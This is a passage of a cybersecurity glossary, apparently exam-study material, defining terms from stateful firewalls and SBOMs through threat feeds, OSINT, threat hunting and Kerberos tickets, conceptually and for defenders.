Common industry standards such as these play a significant role in auditing by providing a benchmark for evaluating organizational compliance and security practices. Standards such as ISO 27001, NIST SP800-63, PCI DSS, and FIPS provide comprehensive details and requirements for information security, risk management, data protection, and privacy. Auditing against these standards helps organizations assess their adherence to best practices, identify gaps or vulnerabilities, and demonstrate their commitment to maintaining a secure and compliant environment.

Internal Standards
Organizations also establish internal standards to ensure the safety and integrity of operations and protect valuable resources such as data, intellectual property, and hardware. Internal standards provide consistent descriptions to define and manage important organizational practices. Standards differ from policies in a few ways. A simplistic view of the differences between the two is that standards focus on implementation, whereas policies focus on business practices.

Password standards describe the specific technical requirements required to design and implement systems, including how passwords are managed within those systems to ensure that different systems can interoperate and use consistent password-handling methods.

1. Hashing Algorithms - Defines requirements for the hash functions used to store passwords.

2. Password Salting - Defines the methods used to protect password hashes to protect them from rainbow table attacks.

3. Secure Password Transmission - Defines the methods for secure password transmission, including details regarding appropriate cipher suites.

4. Password Reset - Defines appropriate identity verification methods to protect password reset requests from exploitation.

5. Password Managers - Defines the requirements for password managers that organizations may choose to incorporate.

Access control standards ensure that only authorized individuals can access the systems and data they need to do their jobs to protect sensitive information and help prevent accidental changes or damage. Internally developed access control standards typically include the following elements:

1. Access Control Models - Defines appropriate access models for different use cases. Examples include role-based access control (RBAC), discretionary access control (DAC), and mandatory access control (MAC), among others.

2. User Identity Verification - Defines acceptable methods to verify identities before granting access. Examples include simple passwords, security tokens, biometric data, and other methods.

3. Privilege Management - Defines the methods for managing user privileges to ensure they have the minimum required access.

4. Authentication Protocols - Defines specific acceptable authentication protocols, such as Kerberos, OAuth, or SAML.

5. Session Management - Defines allowable session management practices, including requirements for session timeouts, secure generation and transmission of session cookies, and other similar requirements.

6. Audit Trails - Defines mandatory audit capabilities designed to assist with identifying and investigating security incidents.

Physical security standards protect data centers, computer rooms, wiring closets, cabling, hardware, and infrastructure comprising the IT environment and the people who use and maintain them. Some examples include the following:

1. Building Security - Methods for securing facilities, including card access systems, CCTV surveillance, and security personnel.

2. Workstation Security - Standards for physically securing laptops or other portable devices.

3. Datacenter and Server Room Security - Defines requirements for card access, biometric scans, sign-in/sign-out logs, and escorted access for visitors.

4. Equipment Disposal - Defines requirements for securely disposing (or repurposing) equipment to ensure that sensitive data is irrecoverable.

5. Visitor Management - Defines the requirements for managing visitors, such as sign-in/sign-out procedures, visitor badges, and escorted access requirements.
Encryption protects data from unauthorized access, and it is vital for securing data both at rest (stored data) and in transit (data being transmitted). Encryption standards identify the acceptable cipher suites and expected procedures needed to provide assurance that data remains protected.

1. Encryption Algorithms - Defines allowable encryption algorithms, such as AES (Advanced Encryption Standard) for symmetric or ECC for asymmetric encryption.

2. Key Length - Defines the minimum allowable key lengths for different types of encryption.

3. Key Management - Defines how keys are generated, distributed, stored, and changed. It often includes requirements for using secure key management systems, procedures for regularly changing keys, and procedures for revoking them if they are compromised.
Stateful Firewall - A technique used in firewalls to analyze packets down to the application layer rather than filtering packets only by header information, enabling the firewall to enforce tighter and more security. A stateful inspection firewall tracks information about the session established between two hosts. All firewalls now incorporate some level of stateful inspection capability. Session data is stored in a state table (Information about sessions between hosts that is gathered by a stateful firewall). When a packet arrives, the firewall checks it to confirm whether it belongs to an existing connection. If it does not, it applies the ordinary packet filtering rules to determine whether to allow it. Once the connection has been allowed, the firewall usually allows traffic to pass unmonitored in order to conserve processing effort.
Stateless Firewall - A basic packet filtering firewall is stateless. This means that it does not preserve information about network sessions. Each packet is analyzed independently, with no record of previously processed packets. This type of filtering requires the least processing effort, but it can be vulnerable to attacks spread over a sequence of packets. A stateless firewall can also introduce problems in traffic flow, especially when using some sort of load balancing or when clients or servers need to use dynamically assigned ports.
Statement of Work (SOW) / Work Order (WO) - A document that defines the expectations for a specific business arrangement. Details a vendor project or engagement's scope, deliverables, timelines, and responsibilities. SOWs clarify the vendor's tasks, the organization's expectations, and the agreed-upon deliverables. They are crucial for managing project execution and ensuring vendor and organization alignment.
Static Analysis - The process of reviewing uncompiled source code either manually or using automated tools.
Static Code Analysis - Static code analysis is a crucial software development practice. It involves scrutinizing source code to identify potential vulnerabilities, errors, and noncompliant coding practices before the program is finalized. By examining code in a 'static' state, developers can catch and rectify issues early in the development lifecycle, making it a proactive approach to building secure, reliable, and high-quality software.

Application security approaches focus on software development and deployment lifecycles, with a heavy emphasis on secure coding practices that encourage developers to write code that prevents common vulnerabilities like SQL injection and cross-site scripting. Application security practices also mandate static application security testing (SAST) and dynamic application security testing (DAST). Coding practices designed to support regular patching and updates are crucial to support the prompt resolution of newly discovered vulnerabilities.

Static code analysis supports secure coding and is performed using specialized tools, often integrated into software development suites. These tools automate code checks against pre-determined rules and flag potential issues so developers can review and address them. Some commonly used static analysis tools include SonarQube, Coverity, and Fortify.
Steganography - A technique for obscuring the presence of a message, often by embedding information within a file or other entity.

Steganography (literally meaning "hidden writing") embeds information within an unexpected source; a message hidden in a picture, for instance. The container document or file is called the covertext. The message can be encrypted by some mechanism before embedding it, providing confidentiality. The technology can also provide integrity or non-repudiation; for example, it could show that something was printed on a particular device at a particular time, which could demonstrate that it was genuine or fake, depending on the context.
Structured Exception Handler (SEH) - A mechanism to account for unexpected error conditions that might arise during code execution. Effective error handling reduces the chances that a program could be exploited.
Subject Alternative Name (SAN) - A field in a digital certificate allowing a host to be identified by multiple host names/subdomains.

The subject alternative name (SAN) extension field is structured to represent different types of identifiers, including FQDNs and IP addresses. If a certificate is configured with a SAN, the browser should validate that and ignore the CN value.

The SAN field also allows a certificate to represent different subdomains, such as www.comptia.org and members.comptia.org . Listing the specific subdomains is more secure, but if a new subdomain is added, a new certificate must be issued. A wildcard domain, such as *.comptia.org , means that the certificate issued to the parent domain will be accepted as valid for all subdomains (to a single level).

Different certificate types can be used for purposes other than server/computer identification. User accounts can be issued with email certificates, in which case the SAN is an RFC 822 email address. A code-signing certificate is used to verify the publisher or developer of software and scripts. These don't use a SAN, but the CA must validate the organization and locate details to ensure accuracy and that a rogue developer is not attempting to impersonate a well-known software company.
Substitution Algorithm - A substitution cipher involves replacing characters or blocks in the plaintext with different ciphertext. Simple substitution ciphers rotate or scramble letters of the alphabet. For example, ROT13 rotates each letter 13 places, so A becomes N, for instance. The ciphertext "Uryyb Jbeyq" can be decrypted as the plaintext "Hello World."
Supercookie - As browser software gives the user some control over what cookies to accept, web marketing companies have come up with alternative ways to implement tracking that are difficult to disable. A supercookie is a means of storing tracking data in a non-regular way, such as saving it to cache without declaring the data to be a cookie or encoding data into header requests.
Supervisory Control and Data Acquisition (SCADA) - A type of industrial control system that manages large-scale, multiple-site devices and equipment spread over geographically large areas from a host computer.

A supervisory control and data acquisition (SCADA) system takes the place of a control server in large-scale, multiple-site ICSs. SCADA typically run as software on ordinary computers, gathering data from and managing plant devices and equipment with embedded PLCs, referred to as field devices. SCADA typically use WAN communications, such as cellular or satellite, to link the SCADA server to field devices.
Supplier - Obtains products directly from a manufacturer to sell in bulk to other businesses. This type of trade is referred to as business to business (B2B).
Supply Chain - The end-to-end process of supplying, manufacturing, distributing, and finally releasing goods and services to a customer. A supply chain is the end-to-end process of designing, manufacturing, and distributing goods and services to a customer. Rather than attack the target directly, a threat actor may seek ways to infiltrate it via companies in its supply chain. One high-profile example of this is the Target data breach, which was made via credentials held by the company's building systems vendor.

The process of ensuring reliable sources of equipment and software is called procurement management. In procurement management, it is helpful to distinguish several types of relationships:

1. Supplier - obtains products directly from a manufacturer to sell in bulk to other businesses. This type of trade is referred to as business to business (B2B).

2. Vendor - obtains products from suppliers to sell to retail businesses (B2B) or directly to customers (B2C). A vendor might add some level of customization and direct support.

3. Business Partner - implies a closer relationship where two companies share quite closely aligned goals and marketing opportunities.
Supply Chain Analysis (Vendor Assessment Method) - Supply chain refers to the interconnected network of entities involved in producing, distributing, and delivering goods or services from raw material suppliers to manufacturers, distributors, retailers, and ultimately, the end customer. It is a complex ecosystem involving collaboration between numerous vendors at various stages. Vendors are essential in the supply chain as they provide goods, services, and expertise contributing to the final product or service. Vendors often include raw materials suppliers, manufacturers, logistics providers, and technology solution providers. Each vendor within the supply chain has its own set of capabilities, processes, and potential risks. Managing and assessing these vendors is crucial to ensure the smooth flow of materials, minimize disruptions, maintain quality standards, and uphold security and compliance requirements throughout the supply chain. Supply chain analysis evaluates the risks and vulnerabilities associated with the various entities (vendors) involved in a supply chain by examining the security practices, capabilities, and reliability of individual vendors within the supply chain network and how security issues with one vendor in the chain may compromise the security of the organization's environment. This information helps organizations identify weak links, vulnerabilities, and potential points of compromise within the supply chain so they can be addressed before they cause problems.

Performing vendor site visits offer firsthand observation and assessment of a vendor's physical facilities, operational processes, and overall risk management practices, allowing for a more comprehensive evaluation of potential risks and vulnerabilities.
Supply Chain Attacks - Software supply chain vulnerabilities refer to the potential risks and weaknesses introduced into software products during their development, distribution, and maintenance lifecycle. This supply chain describes many stages, from initial coding to end-user deployment, and includes various service providers, hardware providers, and software providers.

Service Providers
Service providers, such as cloud services or third-party development agencies, play a role in the software supply chain by offering development, testing, and deployment platforms or directly contributing to the software's codebase. Vulnerabilities can be introduced if these services have inadequate security measures or if the communication between these services and the rest of the supply chain is not secured correctly.

Hardware Suppliers
Hardware suppliers play a crucial role in the software supply chain and can be potential sources of vulnerabilities. The hardware on which software runs or interacts forms the base of the technology stack. If this hardware layer is compromised, it can lead to severe security issues. This is particularly true for firmware or low-level software drivers interacting closely with the hardware. If a hardware supplier fails to apply robust security practices in their design and manufacturing processes, it can introduce vulnerabilities that compromise the entire system.

For example, a hardware component could come with preinstalled firmware that contains a known vulnerability, or it might be susceptible to physical tampering that leads to a breach in security. Similarly, hardware devices often require specific drivers to function correctly. If these drivers are not updated regularly or are sourced from unreliable providers, they can introduce vulnerabilities into the software stack.

Furthermore, hardware suppliers often provide the entire software stack running on the device for IoT and embedded systems, making them a significant factor in a system's overall security. Therefore, it's crucial for software supply chain security to ensure that hardware suppliers adhere to stringent security standards and that hardware components and associated low-level software are regularly updated and patched to address any potential vulnerabilities.

Software Providers
Software providers, including makers of libraries, frameworks, and other third-party components used in the software, are a common source of vulnerabilities. If third-party components have vulnerabilities or are outdated, they can expose the entire application to potential attacks. In all these relationships, trust is implicitly placed in each provider to maintain high security. If any link in this chain fails to meet these expectations, it can lead to software supply chain vulnerabilities.

Software Bill of Materials
A software bill of materials (SBOM) is a comprehensive inventory of all components in a software product. This includes the primary application code and all dependencies, such as libraries, frameworks, and other third-party components. The SBOM includes details like component names, versions, and information about the suppliers.

An SBOM aims to provide transparency and visibility into the software supply chain, which can significantly help mitigate software supply chain issues. By detailing all components used in a software product, an SBOM enables developers, security teams, and end users to understand the functional components of their software. This visibility aids in identifying potential vulnerabilities in third-party components, allowing them to be patched or replaced before issues materialize. It also helps track software components' origin, ensuring they come from trusted sources.

After a vulnerability disclosure or a security incident, an SBOM supports rapid response and remediation. Security teams can quickly determine whether their software is affected by a disclosed vulnerability in a particular component and take appropriate action.

An SBOM is a critical tool for managing and securing the software supply chain because it contributes to a more proactive and informed approach to identifying and managing potential software supply chain issues.

Dependency Analysis and SBOM Tools
The OWASP Dependency-Check is a Software Composition Analysis (SCA) tool that identifies project dependencies and checks if there are any known, publicly disclosed vulnerabilities associated with them. This tool is very useful for creating a software bill of materials (SBOM), although it's not its primary function.

Dependency-Check can generate a report detailing all the libraries and components used in a software project and their respective versions. This type of report serves as a baseline for creating an SBOM, as it lists all the components that the software depends upon. Furthermore, the report includes known vulnerabilities associated with these components, a valuable addition to an SBOM from a security perspective.

Dependency-Check is designed primarily to assist in detecting outdated or vulnerable components and does not provide all of the information typically included in an SBOM, such as licensing information or a complete list of all sub-components.

For a more comprehensive SBOM that includes additional information, other tools like OWASP Dependency-Track use the output from Dependency-Check or other dedicated SBOM tools that follow SPDX or OWASP CycloneDX standards. SPDX (Software Package Data Exchange) is an open standard for communicating software bill of material information, including component identification, licensing, and security references. CycloneDX is a lightweight specification designed to provide a more streamlined way to share and analyze SBOM data.
Symmetric Algorithm - A symmetric algorithm is one in which encryption and decryption are both performed by the same secret key. The secret key must be kept known to authorized persons only. If the key is lost or stolen, the security is breached.
Symmetric Encryption / Algorithm - Two-way encryption scheme in which encryption and decryption are both performed by the same key. Also known as shared-key encryption.

A symmetric algorithm is one in which encryption and decryption are both performed by the same secret key. The secret key must be kept known to authorized persons only. If the key is lost or stolen, the security is breached. Symmetric encryption is used for confidentiality. For example, Alice and Bob can share a confidential file in the following way:

1. Alice and Bob meet to agree which cipher to use and a secret key value. They both record the value of the secret key, making sure that no one else can discover it.

2. Alice encrypts a file using the cipher and key.

3. Alice sends only the ciphertext to Bob over the network.

4. Bob receives the ciphertext and is able to decrypt it by applying the same cipher with his copy of the secret key.

Symmetric encryption is very fast. It is used for bulk encryption of large amounts of data. The main problem is how Alice and Bob "meet" to agree upon or exchange the key. If Mallory intercepts the key and obtains the ciphertext, the security is broken.

Note that symmetric encryption cannot be used for authentication or integrity. Alice and Bob are able to create exactly the same secrets, because they both know the same key.
SYN Flood Attack - A DoS attack where the attacker sends numerous SYN requests to a target server, hoping to consume enough resources to prevent the transfer of legitimate traffic.

A SYN flood attack works by withholding the client's ACK packet during TCP's three-way handshake. A server, router, or firewall can maintain a queue of pending connections, recorded in its state table. When it does not receive an ACK packet from the client, it resends the SYN/ACK packet a set number of times before timing out the connection. The problem is that a server may only be able to manage a limited number of pending connections, which the DDoS attack quickly fills up. This means that the server is unable to respond to genuine traffic.
Syslog - Application protocol and event-logging format enabling different appliances and software applications to transmit logs or event records to a central server. Syslog works over UDP port 514 by default.

Syslog provides an open format, protocol, and server software for logging event messages. It is used by a very wide range of host types. For example, syslog messages can be generated by switches, routers, and firewalls, as well as UNIX or Linux servers and workstations.

A syslog message comprises a PRI primary code, a header, and a message part:

1. The PRI code is calculated from the facility and a severity level.

2. The header contains a timestamp, host name, app name, process ID, and message ID fields.

3. The message part contains a tag showing the source process plus content. The format of the content is application dependent. It might use space- or comma-delimited fields or name/value pairs.

Log data can be kept and analyzed on each host individually, but most organizations require better visibility into data sources and host monitoring. SIEM software can offer a "single pane of glass" view of all network hosts and appliances by collecting and aggregating logs from multiple sources. Logs can be collected via an agent running on each host, or by using syslog (or similar) to forward event data.
System Monitor - Software that tracks the health of a computer's subsystems using metrics reported by system hardware or sensors. This provides an alerting service for faults such as high temperature, chassis intrusion, and so on.
Tabletop Exercise - A discussion of simulated emergency situations and security incidents.

Tabletop Exercises involve teams discussing and working through hypothetical scenarios to assess their response plans and decision-making processes. These exercises help identify knowledge, communication, and coordination gaps, ultimately strengthening the organization's incident response capabilities. For example, a tabletop exercise might simulate a ransomware attack to test how well the organization's IT and management teams collaborate to mitigate the threat and restore operations.
Tactics, Techniques, and Procedures (TTPs) - Analysis of historical cyberattacks and adversary actions.	

Antivirus (A-V) scanners work on the basis of recognizing known malware code. The malware code is stored as a signature in the antivirus scanner's database. The database of signatures must be continually updated. When a file is accessed, the A-V intercepts the call and scans the file. If it matches any of its signatures, it blocks access to the file and alerts the user, and logs the event.

This type of signature-based detection is still important for detecting commodity malware attacks, but it is no longer wholly effective. Malicious activity can often only be detected by monitoring for a wider range of indicators. Knowledge of these indicators is formed by studying threat actor behaviors. The outcome of this analysis is described as a tactic, technique, or procedure (TTP):

1. Tactic - High level description of a threat behavior. Behaviors such as reconnaissance, persistence, and privilege escalation are examples of tactics.

2. Technique - Intermediate-level description of how a threat actor progresses a tactic. For example, reconnaissance might be accomplished via techniques such as active network scanning, vulnerability scanning, and email harvesting.

3. Procedure - Detailed description of how a technique is performed. For example, a particular threat actor might use a particular tool in a distinctive way to perform vulnerability scanning.

As an example of TTP analysis, consider the scenario where a criminal gang seeks to blackmail companies by infecting hosts with ransomware. This is the threat actor's goal. To achieve the goal, they deploy a campaign, comprising a number of tactics, such as reconnaissance, resource development, initial access, and execution. Within the initial access tactic, the gang might have developed a novel technique to exploit a vulnerability in some network monitoring software used by a wide range of companies. Analysis of procedures reveals exactly how the exploited software is installed on company networks through an infected repository. This enables the gang's next tactic (execution of malware).
Technical Debt - Costs accrued by keeping an ineffective system or product in place, rather than replacing it with a better-engineered one.

Organizations can accrue technical debt if automation and orchestration tools are implemented hastily, resulting in poorly documented code, "brittle" system integrations, or poor maintenance. Over time, this debt can lead to system instability, complexity, and increased costs, ironically similar to the problems associated mainly with legacy systems.
Technical Security Control - A category of security control that is implemented as a system (hardware, software, or firmware). Technical controls may also be described as logical controls. The control is implemented as a system (hardware, software, or firmware). For example, firewalls, antivirus software, and OS access control models are technical controls.
Temporal Key Integrity Protocol (TKIP) - The mechanism used in the first version of WPA to improve the security of wireless encryption mechanisms, compared to the flawed WEP standard.
Test Access Point (TAP) - A hardware device inserted into a cable run to copy frames for analysis. This is an inline device with ports for incoming and outgoing network cabling and an inductor or optical splitter that physically copies the signal from the cabling to a monitor port. There are types for copper and fiber optic cabling. As a physical layer hardware solution, no logic decisions are made, so the monitor port receives every frame—corrupt or malformed or not—and the copying is unaffected by load.
Test Results (Change Management) - Before implementation, changes must first be evaluated in a test environment to ensure they work as intended and do not cause issues. Test results provide valuable insight into the likelihood of success and help identify potential issues without impacting business operations.
Testing Resiliency - Testing Resiliency

Method of Testing
Testing system resilience and incident response effectiveness are crucial for organizations to recover from disruptions and maintain business continuity. By conducting various tests, organizations can identify potential vulnerabilities, evaluate the efficiency of their recovery strategies, and improve their overall preparedness for real-life incidents.

1. Tabletop Exercises - Involve teams discussing and working through hypothetical scenarios to assess their response plans and decision-making processes. These exercises help identify knowledge, communication, and coordination gaps, ultimately strengthening the organization's incident response capabilities. For example, a tabletop exercise might simulate a ransomware attack to test how well the organization's IT and management teams collaborate to mitigate the threat and restore operations.

2. Failover Tests - Involve intentionally causing the failure of a primary system or component to evaluate the automatic transfer of operations to a secondary, redundant system. These tests ensure backup systems can seamlessly take over during an actual incident, minimizing downtime and data loss. For example, a failover test could involve simulating the failure of a primary database server to verify that a standby server can successfully assume its role and maintain service continuity.

3. Simulations - Are controlled experiments replicating real-world scenarios, allowing organizations to assess their incident response processes and system resilience under realistic conditions. These tests can reveal potential bottlenecks, inefficiencies, or vulnerabilities that might not be apparent in less complex tests. For instance, a simulation might involve a cyberattack targeting the organization's network infrastructure to evaluate the effectiveness of security measures and the ability to detect, contain, and remediate the threat.

4. Parallel Processing Tests - Involve running primary and backup systems simultaneously to validate the functionality and performance of backup systems without disrupting normal operations. These tests help organizations ensure their backup systems can handle the same workload as primary systems during an incident. For example, an organization might run parallel processing tests to verify that a backup datacenter can manage the same traffic and processing demand as the primary datacenter in an outage.

Failure to perform tests such as tabletop exercises, failover tests, simulations, and parallel processing can expose organizations to significant risks. With these tests, organizations can recognize potential vulnerabilities and weaknesses in their incident response plans and system resilience designs and use the results of tests to improve existing plans. In a real-life disruption or cyberattack, untested systems and response procedures may fail to perform as expected, leading to extended downtime, data loss, and reputational damage. Moreover, unprepared organizations may face increased costs related to incident recovery and mitigation and potential regulatory penalties for failing to meet industry standards and compliance requirements. Ultimately, failure to implement these tests can leave organizations inadequately prepared for crises, undermining their ability to maintain business continuity and protect valuable assets.

Documentation
Business continuity documentation practices cover planning, implementation, and evaluation. Documentation supports the testing process. Documentation includes test plans outlining the objectives, scope, and methods of tests and the roles and responsibilities of individuals involved. Test scripts (or scenarios) provide step-by-step instructions for performing the tests, and test results identify strengths and weaknesses of the business continuity plan and the technical capabilities supporting it. Documentation is the foundation for clear communication and reporting of activities. It provides a common reference point for those involved in business continuity testing and facilitates effective communication with management, executive teams, and other relevant stakeholders. Third-party assessments and certifications offer an objective and independent evaluation of an organization's testing practices. Third-party assessments and certifications offer objective evaluation, compliance verification, validation of testing effectiveness, industry recognition, and recommendations for continuous improvement. Examples of third-party evaluations include assessments performed in alignment with ISO 22301, PCI DSS, and SOC 2.
Tethering - Using the cellular data plan of a mobile device to provide Internet access to a laptop or PC. The PC can be tethered to the mobile by USB, Bluetooth, or Wi-Fi (a mobile hotspot).
TGS session Key - It communicates between the client and the Ticket Granting Service (TGS). This is encrypted using a hash of the user's password.
Third Party Certificate Authority (CA) - In PKI, a public CA that issues certificates for multiple domains and is widely trusted as a root trust by operating systems and browsers.

The functions of a third-party public CA are as follows:

1. Provide a range of certificate services useful to the community of users serviced by the CA.

2. Ensure the validity of certificates and the identity of those applying for them (registration).

3. Establish trust in the CA with users, governments, regulatory authorities, and enterprises such as financial institutions.

4. Manage the servers (repositories) that store and administer the certificates.

5. Perform key and certificate lifecycle management, notably revoking invalid certificates.

Most third-party CAs operate a hierarchical model. In the hierarchical model, the root CA issues certificates to one or more intermediate CAs. The intermediate CAs issue certificates to subjects (leaf or end entities). This model has the advantage that different intermediate CAs can be set up with certificate policies enabling users to perceive clearly what a particular certificate is designed for. Each leaf certificate can be traced to the root CA along the certification path. This is also referred to as certificate chaining or a chain of trust.
Third-Party Cloud Vendor - Third-party vendors are external entities that provide organizations with goods, services, or technology solutions. In cloud computing, third-party vendors refer to the providers offering cloud services to businesses using infrastructure-, platform-, or software-as-a-service models. As a third party, careful consideration regarding cloud service provider selection, contract negotiation, service performance, compliance, and communication practices is paramount. Organizations must adopt robust vendor management strategies to mitigate cloud platform risks, ensure service quality, and optimize cloud deployments. Service-level agreements (SLAs) are contractual agreements between organizations and cloud service providers that outline the expected levels of service delivery. SLAs define metrics, such as uptime, performance, and support response times, along with penalties or remedies if service levels are not met. SLAs provide a framework to hold vendors accountable for delivering services at required performance levels.

Organizations must assess the security practices implemented by vendors to protect their sensitive data, including data encryption, access controls, vulnerability management, incident response procedures, and regulatory compliance, and are responsible for ensuring compliance with data privacy requirements, especially if they handle personally identifiable information (PII) or operate in regulated industries. Vendor lock-in makes switching to alternative vendors or platforms challenging or impossible, and so organizations must carefully evaluate data portability, interoperability, and standardization to mitigate vendor lock-in risks. Strategies like multi-cloud or hybrid cloud deployments can provide flexibility and reduce reliance on a single vendor.
Threat - A potential for an entity to exercise a vulnerability (that is, to breach security). Threat is the potential for someone or something to exploit a vulnerability and breach security. A threat can have an intentional motivation or be unintentional. The person or thing that poses the threat is called a threat actor or threat agent. The path or tool used by a malicious threat actor is a threat vector.
Threat Actor - Any entity (individual, group, or organization) that poses a potential threat to an organization's security. This includes hackers, nation-states, insider threats, hacktivists, organized crime groups, and even script kiddies. The term focuses on who is attempting the attack and often includes understanding their motivations, capabilities, and resources. A person or entity responsible for an event that has been identified as a security incident or as a risk.
Threat Feeds - Signatures and pattern-matching rules supplied to analysis platforms as an automated feed.

Another important element of vulnerability management is the use of threat feeds. These are real-time, continuously updated sources of information about potential threats and vulnerabilities, often gathered from multiple sources. By integrating threat feeds into their vulnerability management practices, organizations can stay aware of the latest risks and respond more swiftly.

Threat feeds are pivotal in vulnerability scanning by providing real-time, continuous data about the latest vulnerabilities, exploits, and threat actors. These feeds serve as a valuable resource for enhancing the organization's threat intelligence and enabling quicker identification and remediation of potential vulnerabilities. They integrate data from various sources, including security vendors, cybersecurity organizations, and open-source intelligence, to comprehensively view the threat landscape.

Common threat feed platforms include AlienVault's Open Threat Exchange (OTX), IBM's X-Force Exchange, and Recorded Future. These platforms gather, analyze, and distribute information about new and emerging threats, providing actionable intelligence that can be incorporated into an organization's vulnerability management practices and sometimes directly into security infrastructure tools to provide up-to-the-minute protections.

Threat feeds significantly improve vulnerability identification by providing timely information and context about new threats that traditional vulnerability scanning does not provide. Threat feeds provide information that helps organizations focus their remediation efforts on the most relevant and potentially damaging vulnerabilities first. This proactive approach can significantly reduce the time between discovering a vulnerability and its remediation, thus minimizing the organization's exposure to potential attacks.

Third-Party Threat Feeds
Open-source and proprietary threat feeds provide valuable real-time information on the latest cyber threats and vulnerabilities. Both feed types aggregate data from various sources and can be integrated into an organization's security infrastructure, contributing to a proactive cybersecurity strategy.

The choice between open-source and proprietary threat feeds often comes down to a few important attributes. Open-source feeds, such as those provided by the Cyber Threat Alliance or the MISP threat-sharing platform, are typically free and accessible to all, making them a cost-effective solution for smaller organizations or those with limited budgets. However, they may lack the depth, breadth, or sophistication of analysis found in proprietary feeds.

Proprietary threat feeds often provide more comprehensive information and advanced analytic insights. However, these feeds come at a cost, and the return on investment will depend on an organization's specific needs, risk profile, and resources. Some organizations may use a combination of both open-source and proprietary feeds to achieve a balance of cost and coverage.

The outputs from the primary research undertaken by threat data feed providers and academics can take three main forms:

1. Behavioral Threat Research - Is narrative commentary describing examples of attacks and tactics, techniques, and procedures (TTPs) gathered through primary research sources.

2. Reputational Threat Intelligence (Blocklists of known threat sources, such as malware signatures, IP address ranges, and DNS domains) - Is lists of IP addresses and domains associated with malicious behavior, plus signatures of known file-based malware.

3. Threat Data - Is computer data that can correlate events observed on a customer's own networks and logs with known TTP and threat actor indicators.

Threat data can be packaged as feeds that integrate with a security information and event management (SIEM) platform. These feeds are usually described as cyber threat intelligence (CTI - The process of investigating, collecting, analyzing, and disseminating information about emerging threats and threat sources) data. The data on its own is not a complete security solution. To produce actionable intelligence, the threat data must be correlated with observed data from customer networks. This type of analysis is often powered by artificial intelligence (AI - The science of creating machines with the ability to develop problem-solving and analysis strategies without significant human direction or intervention) features of the SIEM.

Threat intelligence platforms and feeds are often supplied on a closed/proprietary (Software code or security research that remains in the ownership of the developer and may only be used under permitted license conditions) basis. A proprietary feed is where threat research and CTI data is available as a paid subscription to a commercial threat intelligence platform. The security solution provider will also make the most valuable research available early to platform subscribers in the form of blogs, white papers, and webinars. Some examples of such platforms include the following:

1. IBM X-Force Exchange

2. Mandiant's FireEye

3. Recorded Future

Information-Sharing Organizations
Threat feed information-sharing organizations (Collaborative groups that exchange data about emerging cybersecurity threats and vulnerabilities) are collaborative groups that exchange data about emerging cybersecurity threats and vulnerabilities. These organizations collect, analyze, and disseminate threat intelligence from various sources, including their members, security researchers, and public sources. Members of these organizations, often composed of businesses, government entities, and academic institutions, can benefit from the shared intelligence by gaining insights into the latest threats they might not have access to individually. They can use this information to fortify their systems and respond swiftly to emerging threats.

Examples of such organizations include the Cyber Threat Alliance and the Information Sharing and Analysis Centers (ISAC - A not-for-profit group set up to share sector-specific threat intelligence and security best practices among its members) which span various industries. These organizations are crucial in enhancing collective cybersecurity resilience and promoting a collaborative approach to tackling cyber threats.

Open-Source Intelligence
Open-source intelligence (OSINT - Publicly available information plus the tools used to aggregate and search it) describes collecting and analyzing publicly available information and using it to support decision-making. In cybersecurity operations, OSINT is used to identify vulnerabilities and threat information by gathering data from many sources such as blogs, forums, social media platforms, and even the dark web. This can include information about new types of malware, attack strategies used by cybercriminals, and recently discovered software vulnerabilities. Security researchers can use OSINT tools to automatically collect and analyze this information, identifying potential threats or vulnerabilities that could impact their organization.

Some common OSINT tools include Shodan for investigating Internet-connected devices, Maltego for visualizing complex networks of information, Recon-ng for web-based reconnaissance activities, and theHarvester for gathering emails, subdomains, hosts, and employee names from different public sources.

The OSINT Framework is a useful resource designed to help locate and organize tools used to perform open-source intelligence.

OSINT can provide valuable context to aid in assessing risk levels associated with a specific vulnerability. For example, newly discovered vulnerabilities that are being actively exploited in the wild or discussed in hacking forums will need to be prioritized for remediation. In this way, OSINT helps identify vulnerabilities and plays a critical role in vulnerability management and threat assessment.
Threat Hunting - A cybersecurity technique designed to detect the presence of threats that have not been discovered by normal security monitoring.

Threat hunting utilizes insights gained from threat intelligence to proactively discover whether there is evidence of TTPs already present within the network or system. This contrasts with a reactive process that is only triggered when alert conditions are reported through an incident management system. Threat hunting can provide useful information to the incident response preparation process, such as demonstrating the value of investments in security tools and showing the need for improvements to detection and analysis processes.

A threat hunting project is likely to be led by senior security analysts, but some general points to observe include the following:

1. Advisories and bulletins that warn of new threat types - Threat hunting is a labor-intensive activity and so needs to be performed with clear goals and resources. Threat hunting usually proceeds according to some hypothesis of possible threat. Security bulletins and advisories from vendors and security researchers about new TTPs and/or vulnerabilities may be the trigger for establishing a threat hunt. For example, if threat intelligence reveals that Windows desktops in many companies are being infected with a new type of malware that is not being blocked by any current malware definitions, you might initiate a threat-hunting plan to detect whether the malware is also infecting your systems.

2. Intelligence fusion (In threat hunting, using sources of threat intelligence data to automate detection of adversary IoCs and TTPs) and threat data - Threat hunting can be performed by manual analysis of network and log data, but this is a very lengthy process. An organization with a security information and event management (SIEM) and threat analytics platform can apply intelligence fusion techniques. The analytics platform is kept up to date with a TTP and indicator threat data feed. Analysts can develop queries and filters to correlate threat data against on-premises data from network traffic and logs.

3. Maneuver (In threat hunting, the concept that threat actor and defender may use deception or counterattacking strategies to gain positional advantage) - When investigating a suspected live threat, you must remember the adversarial nature of hacking. A capable threat actor is likely to have anticipated the likelihood of threat hunting and attempted to deploy countermeasures to frustrate detection. For example, the attacker may trigger a denial of service attack to divert the security team's attention and then attempt to accelerate plans to achieve actions on objectives. Maneuver is a military doctrine term relating to obtaining positional advantage. As an example of defensive maneuver, threat hunting might use passive discovery techniques so that threat actors are given no hint that an intrusion has been discovered before the security team has a containment, eradication, and recovery plan.
Threat Vector - The specific method or pathway a threat actor uses to gain unauthorized access to a system or deliver a payload. Examples include phishing emails, malicious USB drives, unpatched software vulnerabilities, compromised credentials, or misconfigured cloud services. Think of it as the "how" of an attack. A specific path by which a threat actor gains unauthorized access to a system.
Throughput (Speed) - The time required to create a template for each user and the time required to authenticate. This is a major consideration for high-traffic access points, such as airports or railway stations.
Ticket Granting Ticket (TGT) - In Kerberos, a token issued to an authenticated account to allow access to authorized application servers.
Token Generation - Methods for generating cryptographic tokens for authentication, including certificate-based, OTP-based, and public/private key approaches.

There are three main types of token generation:

1. Certificate-Based Authentication - It is when the supplicant controls a private key that can generate a unique signed token. The identity provider can verify the signature via the public key. The main drawback of this approach is the administrative burden of implementing PKI to issue digital certificates.

